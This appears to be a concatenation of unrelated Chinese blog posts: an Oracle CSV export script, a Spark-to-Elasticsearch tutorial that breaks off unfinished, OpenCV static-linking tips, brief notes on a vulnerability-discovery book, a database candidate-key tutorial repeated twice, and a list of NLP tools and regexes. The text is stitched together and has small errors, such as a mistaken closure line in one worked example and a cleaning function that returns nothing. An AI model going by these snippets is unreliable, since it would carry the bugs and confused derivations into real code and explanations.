# -*- coding:utf-8 -*-
"""@author:season@file:export_view.py@time:2018/5/211:19"""

import cx_Oracle
import calendar

########################链接数据库相关######################################

def getConnOracle(username,password,ip,service_name):
    try:
        conn = cx_Oracle.connect(username+'/'+password+'@'+ip+'/'+service_name)  # 连接数据库
        return conn
    except Exception:
        print(Exception)
#######################进行数据批量插入#######################


def insertOracle(conn,year,month,day):

    yearandmonth = year + month

    table_name ='ex_vw_'+ yearandmonth
    cursor = conn.cursor()
##创建表之前先删除表
    try:
        str_drop_table = '''drop table ''' + table_name
        cursor.execute(str_drop_table)
    except cx_Oracle.DatabaseError as msg:
        print(msg)

    try:
#create table and insert
        str_create_table = '''create table ''' + table_name+ ''' as select * from EXPORT where date_from = to_date(' '''+ year + '-'+ month + '''-01','yyyy-mm-dd')'''
        print(str_create_table)
        cursor.execute(str_create_table)

        for i in range(2,day):
            if i < 10:
                str_incert =  '''Insert into ''' + table_name +''' select * from EXPORT where date_from = to_date(' '''+ year+'-'+month+'-'+str(0)+str(i)+'''','yyyy-mm-dd')'''
            else:
                str_incert = '''Insert into ''' + table_name + ''' select * from EXPORT where date_from = to_date(' '''+ year+'-'+month+'-'+ str(i)+'''','yyyy-mm-dd')'''
            print(str_incert)
            cursor.execute(str_incert)
            conn.commit()

        conn.commit()

#export big_table
        str_QUERY  = 'select * from ex_vw_'+ yearandmonth
        str_DIR = 'OUT_PATH'
        str_FILENAME  = 'EXPORT'+yearandmonth+'.csv'

        cursor.callproc('SQL_TO_CSV', [str_QUERY,str_DIR, str_FILENAME])

    except cx_Oracle.DatabaseError as msg:
        print(msg)


#导出数据后drop table
    try:
        str_drop_table = '''drop table ''' + table_name
        print(str_drop_table)
        cursor.execute(str_drop_table)
    except cx_Oracle.DatabaseError as msg:
        print(msg)

    cursor.close()


def main():
    username = 'xxx'
    password = 'xxx'
    ip = '127.0.0.1'
    service_name = 'orcl'
    #获取数据库链接
    conn = getConnOracle(username,password,ip,service_name)

    monthlist = ['06','05','04','03','02','01']
    daylist = [30,31,30,31,28,31]
    for i in range(0,len(monthlist)):
        insertOracle(conn,'2018',monthlist[i],daylist[i]+1)




    conn.close()

if __name__ == '__main__':
    main()

5.spark dataframe 数据导入Elasticsearch
5.1 dataframe 及环境初始化
初始化， spark 第三方网站下载包：elasticsearch-spark-20_2.11-6.1.1.jar
http://spark.apache.org/third-party-projects.html
import sys
import os
print(os.getcwd())
# 加载包得放在这里
os.environ['PYSPARK_SUBMIT_ARGS'] = '--jars elasticsearch-spark-20_2.11-6.1.1.jar pyspark-shell'

import os
from pyspark.sql import SparkSession
from pyspark import SparkConf
from pyspark.sql.types import *
from pyspark.sql import functions as F
from pyspark.storagelevel import StorageLevel
import json
import math
import numbers
import numpy as np
import pandas as pd

os.environ["PYSPARK_PYTHON"] = "/home/hadoop/anaconda/envs/playground_py36/bin/python"



try:
    spark.stop()
    print("Stopped a SparkSession")
except Exception as e:
    print("No existing SparkSession")

SPARK_DRIVER_MEMORY= "10G"
SPARK_DRIVER_CORE = "5"
SPARK_EXECUTOR_MEMORY= "3G"
SPARK_EXECUTOR_CORE = "1"


conf = SparkConf().\
        setAppName("insurance_dataschema").\
        setMaster('yarn-client').\
        set('spark.executor.cores', SPARK_EXECUTOR_CORE).\
        set('spark.executor.memory', SPARK_EXECUTOR_MEMORY).\
        set('spark.driver.cores', SPARK_DRIVER_CORE).\
        set('spark.driver.memory', SPARK_DRIVER_MEMORY).\
        set('spark.driver.maxResultSize', '0').\
        set("es.index.auto.create", "true").\
        set("es.resource", "tempindex/temptype").\
        set("spark.jars", "elasticsearch-hadoop-6.1.1.zip")  # set the spark.jars
    
        
spark = SparkSession.builder.\
    config(conf=conf).\
    getOrCreate()

sc=spark.sparkContext
hadoop_conf = sc._jsc.hadoopConfiguration()

hadoop_conf.set("mapreduce.fileoutputcommitter.algorithm.version", "2")

5.2 清洗及写入数据

数据加载

#数据加载
df = (spark
                 .read
                 .option("header","true")
                 .option("multiLine", "true")
                 .csv('EXPORT.csv')
                 .cache()
                )
print(df.count())


#


数据清洗，增加一列，或者针对某一列进行udf 转换

'''  
#加一列yiyong ，如果是众城数据则为zhongcheng
'''

from pyspark.sql.functions import udf


from pyspark.sql import functions
df = df.withColumn('customer',functions.lit("腾讯用户"))


使用udf 清洗时间格式及数字格式

#udf 清洗时间
#清洗日期格式字段
from dateutil import parser

def clean_date(str_date):
    try:
        if str_date:
            d = parser.parse(str_date)
            return d.strftime('%Y-%m-%d')
        else:
            return None
    except Exception as e:
         return None
        


func_udf_clean_date = udf(clean_date, StringType())

def is_number(s):
    try:
        float(s)
        return True
    except ValueError:
        pass
    return False

def clean_number(str_number):

    try:
        if str_number:

                if is_number(str_number):
                    return str_number
                else:
                    None
        else:
            return None
    except Exception as e:
        return None




func_udf_clean_number = udf(clean_number, StringType())

column_Date = [
"DATE_FROM",
"DATE_TO",
]


for column in column_Date:
      df=df.withColumn(column,  func_udf_clean_date(df[column]))

df.select(column_Date).show(2)


#数据写入

df.write.format("org.elasticsearch.spark.sql").\
option("es.nodes", "IP").\
option("es.port","9002").\
mode("Overwrite").\
save("is/doc")


未完待续







大体上要注意一下几点内容:
1.vc++目录的选择上，库目录选择为opencv目录中的staticlib目录
 
2.在链接-》输入-》附加依赖库，中添加，相应的staticlib库目录中的所有条目
 
我使用的是opencv2.4.4包括一下内容：
 
IlmImf.lib
libjasper.lib
libjpeg.lib
libpng.lib
libtiff.lib
opencv_calib3d244.lib
opencv_contrib244.lib
opencv_core244.lib
opencv_features2d244.lib
opencv_flann244.lib
opencv_gpu244.lib
opencv_haartraining_engine.lib
opencv_highgui244.lib
opencv_imgproc244.lib
opencv_legacy244.lib
opencv_ml244.lib
opencv_nonfree244.lib
opencv_objdetect244.lib
opencv_photo244.lib
opencv_stitching244.lib
 opencv_ts244.lib
opencv_video244.lib
opencv_videostab244.lib
Zlib.lib

 
可能还需要给代码上添加以下内容：
#pragma   comment(lib,   "vfw32.lib ")
#pragma comment (lib , "comctl32.lib")
 
3.在c/c++ --》代码生成--》运行库，选择，多线程/MT，即为静态库编译
 
参照上面的方法，对下面的教程，在vs2010中，编译出了release版本的程序
大概为3.22M大小，在不使用opencv其他dll 的库的情况下，可以直接在win32、64系统上使用
 
http://wiki.opencv.org.cn/index.php/%E4%BA%BA%E8%84%B8%E6%A3%80%E6%B5%8B
 
 4.最后需要注意的是，如果实在还是有问题，还有杀手锏，就是所有静态lib直接copy到相应的目录下面，完后编译链接，windows有时候就是找不到。。。！！！






学习使用的书籍：《暗战亮剑——软件漏洞发掘与安全防范实践》
 
 
第一章 软件漏洞的分类：
 
1.缓冲区溢出漏洞
2.整数溢出漏洞
3.格式化字符串漏洞
4.指针覆盖漏洞
5.SQL注入漏洞
6.Bypass漏洞（绕过漏洞）
7.信息泄漏漏洞
 
第二章 建立软件漏洞的发掘环境：
 
很多机器没有IIS，我们可以使用XAMPP来代替，可以从http://download.csdn.net/detail/bubujie/3772362 网站上下载，下载安装完成后，将你的网站程序文件放到XAMPP程序的安装目录下的htdocs文件目录下，在浏览器中输入网址“http://127.0.0.1/你网站程序的名字”，就可以访问了
 
 
 
第三章 文字处理软件的漏洞剖析
 
 尽可能详细的阅读软件的使用说明书，了解软件的全部功能，发现软件使用过程中的限制问题。这就是主动功能测试的思想。
 
第四章 远程服务型软件漏洞
 
明文分析--
WinSock Expert
Acunetic Web Vulnerability Scanner
非明文分析——
WireShark
FTP安全测试工具——
Infigo FTPStress Fuzzer
 
 
 
 
更新至2013.9.28





候选码的求解基本方法集合
一、求解候选码基本算法的具体步骤.
第1 步,求关系模式R < U , F > 的最小函数依赖集F
第2 步, 按照上面的定义, 分别计算出UL ,UR , UB （UL 表示仅在函数依赖集中各依赖关系式左边出现的属性的集合; UR 表示仅在函数依赖集中各依赖关系式右边出现的属性的集合;另记UB = U - UL - UR ）
第3 步,若UL ≠Φ,计算UL的闭包，若UL+ = U ,则UL 为R 的唯一的候选码,算法结束. 若UL+ ≠U ,转第4 步. 若UL = Φ,转第5 步.
第4 步,将UL 依次与UB 中的属性组合,利用上述的定义4 判断该组合属性是否是候选码; 找出所有的候选码后,算法结束.
第5 步,对UB 中的属性及属性组合利用上述的定义4 依次进行判断;找出所有的候选码后,算法结束.
简而言之：取最小依赖集，计算UL闭包，如果UL闭包包含全属性，则UL为唯一侯选码，如果不包含，则依次与UB属性组合后再求闭包是否包含全属性。
（UL为空时，直接取UB依次组合求闭包）
二、多属性依赖集候选码求解法
输入:关系模式R及其函数依赖集F。
输出:R的所有候选码。
具体步骤:
1)把R的所有属性分为L、R、N和LR四类,并令X代表L、N类,Y代表LR类。
2)求X+,如果X+包含了R的全部属性,则X为R的唯一候选码,转(5);否则,转(3)。
3)在Y中取一个属性A,求(XA)+,如果它包含了R的全部属性,则转(4);否则,调换一个属性反复进行这一过程,直到试完所有Y中的属性。
4)如果已经找到所有的候选码,则转(5);否则在Y中依次去两个、三个……求它们的属性闭包,直到其闭包包含R的所有属性。
5)停止,输出结果。
简而言之：取一个X属性（X为L、N类）求闭包，如果包含R全部属性则为码，否则取一个LR类的Y属性A，求XA闭包，未包含R全属性则调换A，包含R全属性且找到所有码则结束，否则依次取2、3个。
三、依次递推法：
具体方法:给出一个关系模式R及所对应的函数依赖集F,经过初步判断,在函数依赖集中没有属于L的属性,所有属性都是属于LR类的,此时可以在函数依赖集中找出作为确定因素在左部出现频率最多的属性,如X,求X闭包,若其闭包包含了R中的所有属性,则X为R的一个候选码;再找出能够确定X的属性,如Y→X,求Y的闭包,若Y的闭包包含了R中的所有属性,则Y为R的一个候选码,依次往下找,直到把所有的函数依赖找完;单个属性的找完了后再找两个属性结合的,注意:此时不应该把原来求解出的候选码再进行组合(可以采用一般求解法)。
如设有关系模式R(A,B,C,D,E),其上的函数依赖集F={A→BC,CD→E,B→D,E→A},求出R的所有候选码。
根据上述方法,具体求解步骤如下:把F右部单一化后F={ A→B,A→C,CD→E,B→D,E→A };根据判断,A作为确定因素在左部出现的频率最高,求A+=ABCDE,又有E→A,求E+=ABCDE而CD→E,求(CD)+=ABCDE,可以得出属性A,E,CD为候选码;除去A,E,CD外,根据一般求解法求两个属性组合的闭包,可以得到(BC)+=ABCDE,最后可以算出R的候选码为:A,E,CD,BC。
简而言之：没有L，所有属性都属LR，取左边出现频率最多的属性X，求X+，若包含R中所有属性，则X为侯选码。找能决定X的属性Y，求Y+，说Y+包含R中所有属性，则Y也是。单个完后找两两结合，依次类推。（侯选码不参与结合）
四、一般的求候选码的算法
已知关系模式R(U)属性集是A1A2...An及R的函数依赖集F,求R(U)的一个候选码。
算法：
KEY(X,F)
K=A1A2…An;
For i=1 to n
{求K-Ai相对于F的属性闭包(K-Ai)F+;
if (K-Ai)F + =U then K=K-Ai
else then K=K; }
return K;
利用此算法求R(U)的候选码时,只能求出一个,并不能保证求出所有的码。但可以用同样的方法调整属性的删除次序而把所有的候选码都求解出来。
如此题设关系R(ABCD)及R上成立的函数依赖集为F,F={AB→C,C→D,D→A},求R的所有码。
按照上面的算法具体步骤如下:
设K={ABCD},当K=BCD时,由于KF+=ABCD，所以根据算法可删除A;
K=CD,由于KF+=ACD又因KF+不等于ABCD,所以根据算法,B不可删除;
K=BD,由于KF+=ABCD且因KF+=AB-CD,所以根据算法C可删除;
K=B,由于KF+=B又因KF+不等于ABCD,
所以根据算法,D不可删除;最后可求出KEY=BD,用同样的方法调整属性的删除次序,还可以得到另外的一个候选码AB,所以最后可以得到R的码为BD和AB。
一般求解算法适用于在判断了所有的属性均是属于在函数依赖的左部和右部都出现且在后面的几种算法都不适合的情况下采用的。
简而言之：算法概述——有N个属性，从1到N循环。K初始为全部属性，每次循环时减去第N个属性，如果KF+包含全部属性，则K的值重新附值为K减去第N个属性后的值；否则K仍为上次循环后的值。（算法适于所有属性皆为LR类且其他算法不合适时，实际算时要更换删除顺序后反复计算）
五、快速求候选码的方法
首先对于给定的R(U)和函数依赖集F,可以将它的属性划分为4类:
L类,仅出现在F的函数依赖左部的属性。
R类,仅出现在F的函数依赖右部的属性。
N类,在F的函数依赖左部和右部均未出现的属性。
LR类,在F的函数依赖左部和右部两部均出现的属性。
根据以下定理和推论来求解候选码。
定理1:对于给定的关系模式R及其函数依赖集F,若X(X∈R)是L类属性,则X必为R的任一候选码的成员。
推论1:对于给定的关系模式R及其函数依赖集F,若X(X∈R)是L类属性,且X+包含了R的全部属性,则X必为R的唯一候选码。
定理2:对于给定的关系模式R及其函数依赖集F,若X(X∈R)是R类属性,则X不在任何候选码中。
定理3:设有关系模式R及其函数依赖集F,如果X是R的N类属性,则X必包含在R的任一候选码中。
推论2:对于给定的关系模式R及其函数依赖集F,如果X是R的N类和L类组成的属性集,且X+包含了R的有属性,则X是R的唯一候选码。
例：如设有关系模式R(U),其函数依赖集为F,其中:
U={A,B,C,D,E},　F={A→C,C→A,B→AC,D→AC}
求R的候选码。
解:根据函数依赖可得:
属性B、D为L类,E为N类,因此属性B、D、E必为候选码的成员,且此三个属性的闭包:B+=ABC,(BD)+=ABCD,(BDE)+=ABCDE,根据推论2可得BDE是R的唯一候选码。所以R的候选码为BDE。
如果把例题中关系模式R(U)中的属性E去掉,那么再求R的候选码的话可以根据推论1得出BD为R的唯一候选码。
快速求解方法适用于判断有属性是属于L类、N类或其中一种的情况下求解。如果有L类和N类的属性,则求解候选码速度非常快。
简而言之：L、R、N、LR类。根据定理，L、N类必为侯选码之一，如果L+包含全部R，则L为唯一侯选。R类不在任何侯选码中。L+N类且（L+N）+包含所有R，则L+N为唯一侯选。（适于有L、N类至少一种的情况。）
六、左边为单属性的函数依赖集的候选码成员的图论判定方法
算法2:单属性依赖集图论求解法。
输入:关系模式R,R的单属性函数依赖集F。
输出:R的所有候选码。
步骤:
1、求F的最小函数依赖集;
2、构造函数依赖图FDG;
3、从图中找出关键属性集X(X可为空);
4、查看G中有无独立回路,如果没有则输出X即为R的唯一候选码,转6);如果有则转5);
5、从各独立回路中去取一结点对应的属性与X组合成一候选码,并重复这一过程,取尽所有可能的组合,即为R的全部候选码;
6、结束。
如已知有关系模式R(U),其函数依赖集为F,其中：
R={A,B,C,D,E,F}，　F={A→B,C→D,D→E,E→F,F→C},求R的所有候选码。
根据算法，具体步骤如下：
求最小函数依赖集Fm,Fm={ A→B,C→D,D→E,E→F,F→C };
构造函数依赖图。
关键属性为:A
在图1中可以看到有一条独立回路CDFE,所以M=4,因此共有4个候选码,每个候选码有N=1+1=2个属性。
最后可得R的候选码为:AC,AD,AE,AF。 
此方法适用于左部是单个属性的函数依赖求解候选码,而且如果用快速求解法又不是能很快地求解出来候选码来的情况。
 






候选码的求解基本方法集合
 
一、求解候选码基本算法的具体步骤.
第1 步,求关系模式R < U , F > 的最小函数依赖集F
第2 步, 按照上面的定义, 分别计算出UL ,UR , UB （UL 表示仅在函数依赖集中各依赖关系式左边出现的属性的集合; UR 表示仅在函数依赖集中各依赖关系式右边出现的属性的集合;另记UB = U - UL - UR ）
第3 步,若UL ≠Φ,计算UL的闭包，若UL+ = U ,则UL 为R 的唯一的候选码,算法结束. 若UL+ ≠U ,转第4 步. 若UL = Φ,转第5 步.
第4 步,将UL 依次与UB 中的属性组合,利用上述的定义4 判断该组合属性是否是候选码; 找出所有的候选码后,算法结束.
第5 步,对UB 中的属性及属性组合利用上述的定义4 依次进行判断;找出所有的候选码后,算法结束.

简而言之：取最小依赖集，计算UL闭包，如果UL闭包包含全属性，则UL为唯一侯选码，如果不包含，则依次与UB属性组合后再求闭包是否包含全属性。
（UL为空时，直接取UB依次组合求闭包）

二、多属性依赖集候选码求解法
输入:关系模式R及其函数依赖集F。
输出:R的所有候选码。
具体步骤:

1)把R的所有属性分为L、R、N和LR四类,并令X代表L、N类,Y代表LR类。
2)求X+,如果X+包含了R的全部属性,则X为R的唯一候选码,转(5);否则,转(3)。
3)在Y中取一个属性A,求(XA)+,如果它包含了R的全部属性,则转(4);否则,调换一个属性反复进行这一过程,直到试完所有Y中的属性。
4)如果已经找到所有的候选码,则转(5);否则在Y中依次去两个、三个……求它们的属性闭包,直到其闭包包含R的所有属性。
5)停止,输出结果。
简而言之：取一个X属性（X为L、N类）求闭包，如果包含R全部属性则为码，否则取一个LR类的Y属性A，求XA闭包，未包含R全属性则调换A，包含R全属性且找到所有码则结束，否则依次取2、3个。

三、依次递推法
具体方法:给出一个关系模式R及所对应的函数依赖集F,经过初步判断,在函数依赖集中没有属于L的属性,所有属性都是属于LR类的,此时可以在函数依赖集中找出作为确定因素在左部出现频率最多的属性,如X,求X闭包,若其闭包包含了R中的所有属性,则X为R的一个候选码;再找出能够确定X的属性,如Y→X,求Y的闭包,若Y的闭包包含了R中的所有属性,则Y为R的一个候选码,依次往下找,直到把所有的函数依赖找完;单个属性的找完了后再找两个属性结合的,注意:此时不应该把原来求解出的候选码再进行组合(可以采用一般求解法)。
如设有关系模式R(A,B,C,D,E),其上的函数依赖集F={A→BC,CD→E,B→D,E→A},求出R的所有候选码。
根据上述方法,具体求解步骤如下:把F右部单一化后F={ A→B,A→C,CD→E,B→D,E→A };根据判断,A作为确定因素在左部出现的频率最高,求A+=ABCDE,又有E→A,求E+=ABCDE而CD→E,求(CD)+=ABCDE,可以得出属性A,E,CD为候选码;除去A,E,CD外,根据一般求解法求两个属性组合的闭包,可以得到(BC)+=ABCDE,最后可以算出R的候选码为:A,E,CD,BC。
简而言之：没有L，所有属性都属LR，取左边出现频率最多的属性X，求X+，若包含R中所有属性，则X为侯选码。找能决定X的属性Y，求Y+，说Y+包含R中所有属性，则Y也是。单个完后找两两结合，依次类推。（侯选码不参与结合）
 

四、一般的求候选码的算法
已知关系模式R(U)属性集是A1A2...An及R的函数依赖集F,求R(U)的一个候选码。
算法：
KEY(X,F)
K=A1A2…An;
For i=1 to n
{求K-Ai相对于F的属性闭包(K-Ai)F+;
if (K-Ai)F + =U then K=K-Ai
else then K=K; }
return K;
利用此算法求R(U)的候选码时,只能求出一个,并不能保证求出所有的码。但可以用同样的方法调整属性的删除次序而把所有的候选码都求解出来。
如此题设关系R(ABCD)及R上成立的函数依赖集为F,F={AB→C,C→D,D→A},求R的所有码。
按照上面的算法具体步骤如下:
设K={ABCD},当K=BCD时,由于KF+=ABCD，所以根据算法可删除A;
K=CD,由于KF+=ACD又因KF+不等于ABCD,所以根据算法,B不可删除;
K=BD,由于KF+=ABCD且因KF+=AB-CD,所以根据算法C可删除;
K=B,由于KF+=B又因KF+不等于ABCD,
所以根据算法,D不可删除;最后可求出KEY=BD,用同样的方法调整属性的删除次序,还可以得到另外的一个候选码AB,所以最后可以得到R的码为BD和AB。
一般求解算法适用于在判断了所有的属性均是属于在函数依赖的左部和右部都出现且在后面的几种算法都不适合的情况下采用的。
简而言之：算法概述——有N个属性，从1到N循环。K初始为全部属性，每次循环时减去第N个属性，如果KF+包含全部属性，则K的值重新附值为K减去第N个属性后的值；否则K仍为上次循环后的值。（算法适于所有属性皆为LR类且其他算法不合适时，实际算时要更换删除顺序后反复计算）
五、快速求候选码的方法
首先对于给定的R(U)和函数依赖集F,可以将它的属性划分为4类:
L类,仅出现在F的函数依赖左部的属性。
R类,仅出现在F的函数依赖右部的属性。
N类,在F的函数依赖左部和右部均未出现的属性。
LR类,在F的函数依赖左部和右部两部均出现的属性。
根据以下定理和推论来求解候选码。
定理1:对于给定的关系模式R及其函数依赖集F,若X(X∈R)是L类属性,则X必为R的任一候选码的成员。
推论1:对于给定的关系模式R及其函数依赖集F,若X(X∈R)是L类属性,且X+包含了R的全部属性,则X必为R的唯一候选码。
定理2:对于给定的关系模式R及其函数依赖集F,若X(X∈R)是R类属性,则X不在任何候选码中。
定理3:设有关系模式R及其函数依赖集F,如果X是R的N类属性,则X必包含在R的任一候选码中。
推论2:对于给定的关系模式R及其函数依赖集F,如果X是R的N类和L类组成的属性集,且X+包含了R的有属性,则X是R的唯一候选码。
例：
如设有关系模式R(U),其函数依赖集为F,其中:U={A,B,C,D,E},　F={A→C,C→A,B→AC,D→AC} 求R的候选码。
解:
根据函数依赖可得:
属性B、D为L类,E为N类,因此属性B、D、E必为候选码的成员,
且此三个属性的闭包:B+=ABC,(BD)+=ABCD,(BDE)+=ABCDE,根据推论2可得BDE是R的唯一候选码。
所以R的候选码为BDE。
如果把例题中关系模式R(U)中的属性E去掉,那么再求R的候选码的话可以根据推论1得出BD为R的唯一候选码。
 
快速求解方法适用于判断有属性是属于L类、N类或其中一种的情况下求解。如果有L类和N类的属性,则求解候选码速度非常快。
简而言之：
L、R、N、LR类。根据定理，L、N类必为侯选码之一，如果L+包含全部R，则L为唯一侯选。R类不在任何侯选码中。
L+N类且（L+N）+包含所有R，则L+N为唯一侯选。（适于有L、N类至少一种的情况。）
 
例题：
设有关系模式R(A,B,C,D,E)，其函数依赖集F={A→BC，CD→E，B→D，E→A}，求R的所有候选码。
解：
(1)Fm={A→B， A→C，CD→E，B→D，E→A}
(2)A，B，C，D，E五个属性在F中各个函数依赖的右边和左边都出现了，所以候选码中可能包含A，B，C，D，E。
(3)A+=ABCDE，即A→U，所以A是一个候选码     B+，C+，D+→U，所以B，C，D不是候选码     E+=ABCDE，即E→U，所以也E是一个候选码
(4)除去A，E两个候选码，在B，C，D中查找两个属性的候选码    (BC)+=ABCDE，即BC→U，所以BC是一个候选码    (BD)+=BD，即BC→U，所以BD不是一个候选码    (CD)+=ABCDE，即CD→U，所以CD是一个候选码
候选码有：A，E，BC，CD
六、左边为单属性的函数依赖集的候选码成员的图论判定方法
算法2:单属性依赖集图论求解法。
输入:关系模式R,R的单属性函数依赖集F。
输出:R的所有候选码。
步骤:

1、求F的最小函数依赖集;
2、构造函数依赖图FDG;
3、从图中找出关键属性集X(X可为空);
4、查看G中有无独立回路,如果没有则输出X即为R的唯一候选码,转6);如果有则转5);
5、从各独立回路中去取一结点对应的属性与X组合成一候选码,并重复这一过程,取尽所有可能的组合,即为R的全部候选码;
6、结束。
如已知有关系模式R(U),其函数依赖集为F,其中：
R={A,B,C,D,E,F}，　F={A→B,C→D,D→E,E→F,F→C},求R的所有候选码。
根据算法，具体步骤如下：
求最小函数依赖集Fm,Fm={ A→B,C→D,D→E,E→F,F→C };
构造函数依赖图。
关键属性为:A
在图1中可以看到有一条独立回路CDFE,所以M=4,因此共有4个候选码,每个候选码有N=1+1=2个属性。
最后可得R的候选码为:AC,AD,AE,AF。 
此方法适用于左部是单个属性的函数依赖求解候选码,而且如果用快速求解法又不是能很快地求解出来候选码来的情况。
例：设有关系模式R(O,B,I,S,Q,D)，其函数依赖集F={S→D，D→S，I→B，B→I ，B→O， O→B}，求R的所有候选码。
解：
(1)FM=F= {S→D，D→S，I→B，B→I ，B→O， O→B}
(2)构造函数依赖图，如右图所示：

(3)关键属性集：{Q}
(4)共有2条回路，SD，IBO，所以候选码个数是2*3=6，每个候选码的属性个数是1+2=3。
所以R的候选码不唯一，所有候选码为：QSI，QDI，QSB，QDB，QSO，QDO
 
例：设有关系模式R(X,Y,Z,W)，其函数依赖集F={W→Y，Y→W，X→WY，Z→WY ，XZ→W}，求R的所有候选码。
解：
(1)FM= {W→Y，Y→W，X→Y，Z→W}
(2)构造函数依赖图，如右图所示：
(3)关键属性集：{X，Z}
(4)无独立回路
所以，R只有唯一候选码XZ
 









原文链接：https://github.com/fighting41love/funNLP

最近需要从文本中抽取结构化信息，用到了很多github上的包，遂整理了一下，后续会不断更新。
涉及内容包括：中英文。。词、语言检测、中外手机/电话归属地/运营商查询、名字推断性别、手机号抽取、身份证抽取、邮箱抽取、中日文人名库、中文缩写库、拆字词典、词汇情感值、停用词、繁简体转换、英文模拟中文发音、汪峰歌词生成器、职业名称词库、同义词库、反义词库、否定词库、汽车品牌词库、汽车零件词库、连续英文切割、各种中文词向量、公司名字大全、古诗词库、IT词库、财经词库、成语词库、地名词库、历史名人词库、诗词词库、医学词库、饮食词库、法律词库、汽车词库、动物词库、中文聊天语料、中文谣 言数据、百度中文问答数据集、句子相似度匹配算法集合、bert资源、文本生成&摘要相关工具、cocoNLP信息抽取工具、国内电话号码正则匹配、清华大学XLORE:中英文跨语言百科知识图谱、清华大学人工智能技术系列报告、自然语言生成、NLU太难了系列、自动对联数据及机器人、用户名黑名单列表、罪名法务名词及分类模型、微信公众号语料、cs224n深度学习自然语言处理课程、中文手写汉字识别、中文自然语言处理 语料/数据集、变量命名神器、分词语料库+代码、任务型对话英文数据集、ASR 语音数据集 + 基于深度学习的中文语音识别系统、笑声检测器、Microsoft多语言数字/单位/如日期时间识别包、中华新华字典数据库及api(包括常用歇后语、成语、词语和汉字)、文档图谱自动生成、SpaCy 中文模型、Common Voice语音识别数据集新版、神经网络关系抽取、基于bert的命名实体识别、关键词(Keyphrase)抽取包pke。
1. textfilter: 中英文。。词过滤 observerss/textfilter
 >>> f = DFAFilter()
 >>> f.add("sexy")
 >>> f.filter("hello sexy baby")
 hello **** baby

。。词包括政治、脏话等话题词汇。其原理主要是基于词典的查找（项目中的keyword文件），内容很劲爆。。。
2. langid：97种语言检测 https://github.com/saffsd/langid.py

pip install langid

>>> import langid
>>> langid.classify("This is a test")
('en', -54.41310358047485)

3. langdetect：另一个语言检测https://code.google.com/archive/p/language-detection/

pip install langdetect

from langdetect import detect
from langdetect import detect_langs

s1 = "本篇博客主要介绍两款语言探测工具，用于区分文本到底是什么语言，"
s2 = 'We are pleased to introduce today a new technology'
print(detect(s1))
print(detect(s2))
print(detect_langs(s3))    # detect_langs()输出探测出的所有语言类型及其所占的比例

输出结果如下： 注：语言类型主要参考的是ISO 639-1语言编码标准，详见ISO 639-1百度百科
跟上一个语言检测比较，准确率低，效率高。
4. phone 中国手机归属地查询： ls0f/phone

已集成到 python package cocoNLP中，欢迎试用

from phone import Phone
p  = Phone()
p.find(18100065143)
#return {'phone': '18100065143', 'province': '上海', 'city': '上海', 'zip_code': '200000', 'area_code': '021', 'phone_type': '电信'}

支持号段: 13*,15*,18*,14[5,7],17[0,6,7,8]
记录条数: 360569 (updated:2017年4月)
作者提供了数据phone.dat 方便非python用户Load数据。
5. phone国际手机、电话归属地查询：AfterShip/phone

npm install phone

import phone from 'phone';
phone('+852 6569-8900'); // return ['+85265698900', 'HKG']
phone('(817) 569-8900'); // return ['+18175698900, 'USA']

6. ngender 根据名字判断性别：observerss/ngender 基于朴素贝叶斯计算的概率

pip install ngender

>>> import ngender
>>> ngender.guess('赵本山')
('male', 0.9836229687547046)
>>> ngender.guess('宋丹丹')
('female', 0.9759486128949907)

7. 抽取email的正则表达式

已集成到 python package cocoNLP中，欢迎试用

email_pattern = '^[*#\u4e00-\u9fa5 a-zA-Z0-9_.-]+@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.[a-zA-Z0-9]{2,6}$'
emails = re.findall(email_pattern, text, flags=0)

8. 抽取phone_number的正则表达式

已集成到 python package cocoNLP中，欢迎试用

cellphone_pattern = '^((13[0-9])|(14[0-9])|(15[0-9])|(17[0-9])|(18[0-9]))\d{8}$'
phoneNumbers = re.findall(cellphone_pattern, text, flags=0)

9. 抽取身份证号的正则表达式
IDCards_pattern = r'^([1-9]\d{5}[12]\d{3}(0[1-9]|1[012])(0[1-9]|[12][0-9]|3[01])\d{3}[0-9xX])$'
IDs = re.findall(IDCards_pattern, text, flags=0)

10.  人名语料库： wainshine/Chinese-Names-Corpus

人名抽取功能 python package cocoNLP，欢迎试用

中文（现代、古代）名字、日文名字、中文的姓和名、称呼（大姨妈、小姨妈等）、英文->中文名字（李约翰）、成语词典

（可用于中文分词、姓名识别）
11. 中文缩写库：github

中国: 中华人民共和国/ns
女网赛: 女子/n 网球/n 比赛/vn

12. 汉语拆字词典：kfcd/chaizi
漢字	拆法 (一)	拆法 (二)	拆法 (三)
拆	手 斥	扌 斥	才 斥

13. 词汇情感值：rainarch/SentiBridge
山泉水	充沛	0.400704566541	0.370067395878
视野	        宽广	0.305762728932	0.325320747491
大峡谷	惊险	0.312137906517	0.378594957281

14. 中文词库、停用词、词 dongxiexidian/Chinese
此package的词库分类更细：
词库， 词库表统计， 词库， 词库， 词库
15. 汉字转拼音：mozillazg/python-pinyin
文本纠错会用到
16. 中文繁简体互转：skydark/nstools
17. 英文模拟中文发音引擎 funny chinese text to speech enginee：tinyfool/ChineseWithEnglish
say wo i ni
#说：我爱你

相当于用英文音标，模拟中文发音。
18. 汪峰歌词生成器：phunterlau/wangfeng-rnn
我在这里中的夜里
就像一场是一种生命的意旪
就像我的生活变得在我一样
可我们这是一个知道
我只是一天你会怎吗

19. 同义词库、反义词库、否定词库：guotong1988/chinese_dictionary
20. 无空格英文串分割、抽取单词：wordinja
>>> import wordninja
>>> wordninja.split('derekanderson')
['derek', 'anderson']
>>> wordninja.split('imateapot')
['im', 'a', 'teapot']

21. IP地址正则表达式：
(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)

22. 腾讯QQ号正则表达式：
[1-9]([0-9]{5,11})

23. 国内固话号码正则表达式：
[0-9-()（）]{7,18}

24. 用户名正则表达式：
[A-Za-z0-9_\-\u4e00-\u9fa5]+

25. 汽车品牌、汽车零件相关词汇：
见本repo的data文件 [data](https://github.com/fighting41love/funNLP/tree/master/data)

26. 时间抽取：

已集成到 python package cocoNLP中，欢迎试用

在2016年6月7日9:44执行測試，结果如下

Hi，all。下周一下午三点开会

>> 2016-06-13 15:00:00-false

周一开会

>> 2016-06-13 00:00:00-true

下下周一开会

>> 2016-06-20 00:00:00-true

java version
python version
27. 各种中文词向量： github repo
中文词向量大全
